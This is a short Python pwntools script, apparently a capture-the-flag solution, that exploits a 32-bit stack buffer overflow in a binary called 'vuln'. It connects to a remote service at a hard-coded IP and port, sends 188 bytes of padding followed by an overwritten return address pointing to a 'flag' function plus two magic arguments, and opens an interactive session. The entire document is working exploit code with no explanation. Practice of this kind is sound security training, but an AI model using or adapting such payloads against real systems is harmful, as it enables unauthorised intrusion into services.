from pwn import *

elf = ELF('./vuln')
#io = elf.process()
io = remote('64.227.39.88', '32001')

# Enumerate
offset = 188
flag_address = 0x80491e2 # elf.symbols.flag
param_1 = 0xdeadbeef
param_2 = 0xc0ded00d

# Send payload
payload = b'A'*offset + p32(flag_address) + b'a'*4 + p32(param_1) + p32(param_2)
#payload = b'A'*188+b'\xe2\x91\x04\x08'+b'DUMB\xef\xbe\xad\xde\x0d\xd0\xde\xc0'


io.sendline(payload)

io.interactive()
